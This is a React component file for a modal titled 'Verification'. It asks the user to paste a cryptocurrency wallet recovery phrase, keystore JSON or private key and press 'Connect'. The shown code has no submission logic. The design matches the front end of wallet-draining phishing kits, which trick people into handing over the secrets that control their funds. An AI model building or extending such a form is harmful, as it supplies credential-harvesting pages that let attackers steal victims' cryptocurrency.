import { Close } from '@mui/icons-material';
import { Modal } from '@mui/material';
import React, { useState } from 'react';

const ConnectModal = ({ open, setOpen }) => {
	const [activeTab, setActiveTab] = useState('phrase');
	const handleClose = () => {
		setOpen(false);
	};
	const tabFunc = (tab) => {
		if (tab === activeTab) {
			return 'tab active';
		} else {
			return 'tab inactive';
		}
	};
	return (
		<Modal open={open}>
			<div className='container connect'>
				<div className='modal-top'>
					<h2>Verification</h2>
					<Close onClick={handleClose} className='closeIcon' />
				</div>
				<div className='modal-body'>
					<div className='tabs'>
						<div className={`${tabFunc('phrase')}`}>Phrase</div>
						<div className={`${tabFunc('keystore')}`}>
							Keystore JSON
						</div>
						<div className={`${tabFunc('private')}`}>
							Private Key
						</div>
					</div>
					<div className='tab-body'>
						<div className='singleTab-body phrase-body'>
							<textarea
								name=''
								id=''
								placeholder='Phrase'></textarea>
							<p className='tab-info'>
								Typically 12 (sometimes 24) words separated by
								single spaces
							</p>
						</div>
					</div>
                    <div className="submit-container">
                        <button className="submit-btn">
                            Connect
                        </button>
                    </div>
				</div>
			</div>
		</Modal>
	);
};

export default ConnectModal;
